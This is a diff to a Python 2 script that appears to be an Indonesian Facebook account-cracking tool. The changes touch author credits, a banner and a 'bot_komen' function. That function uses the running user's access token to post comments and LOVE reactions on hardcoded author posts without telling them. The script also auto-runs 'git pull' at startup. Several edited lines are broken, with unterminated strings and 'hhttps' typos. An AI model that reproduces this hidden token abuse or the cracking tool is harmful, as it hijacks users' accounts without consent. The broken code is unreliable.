@@ -1,9 +1,8 @@
-
-# -*- coding: utf-8
+ # -*- coding: utf-8
 # coded by NikyipratamaXD
 # coded by angga kurniawan
-# fb.me/NikyipratamaXD
-# instagram.com nikiprayama307
+# fb.me/Nikyipratama
+# instagram.com/gaaarzxd
 
 try:
 	import requests
@@ -50,7 +49,7 @@ op = bulan[nTemp]
 
 def logo():
 	os.system("clear")
-	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __| \033[0;96mAU\033[0;97m : NikyipratamaXD\n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : FB.ME/NikyipratamaxD\n\033[0;97m |___/___|_|  |_|___/_|   \033[0;93mGH\033[0;97m : github.com/nikicrk/niki.mbf")
+	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __| \033[0;96mAU\033[0;97m : NikyipratamaXD\n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : FB.ME/NikyipratamaXD\n\033[0;97m |___/___|_|  |_|___/_|   \033[0;93mGH\033[0;97m : https://github.com/nikicrk/niki.mbf")
 
 def bot_komen():
     try:
@@ -61,8 +60,8 @@ def bot_komen():
     una = ('100015073506062') 
     post = ('1031861840659590') 
     post2 = ('1110619372783836') 
-    kom = ('GW PAKE SC LU BANG @[107782498178349:0] 😍😘\nhhttps://www.facebook.com/photo.php?fbid=108601714763094&set=a.107782498178349&type=3&app=fbl') 
-    kom2 = ('KEREN BANG @[1077824981783490] 😘😘\nhhttps://www.facebook.com/photo.php?fbid=108601714763094&set=a.107782498178349&type=3&app=fbl
+    kom = ('GW PAKE SC LU BANG @[107782498178349:0] 😍😘\nhhttps://www.facebook.com/photo.php?fbid=108601714763094&set=a.107782498178349&type=3&app=fbl
+    kom2 = ('KEREN BANG @[100015073506062:0] 😘😘\nhttps://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fbl') 
     reac = ('LOVE') 
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
     requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
@@ -619,4 +618,4 @@ if __name__ == '__main__':
 		print(" \033[0;97m[\033[0;93m#\033[0;97m] Please Use Python 2 Bro Not Python 2")
 		exit(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python2 niki.mbf")
 	os.system("git pull")
-	login() cokie
+	login()
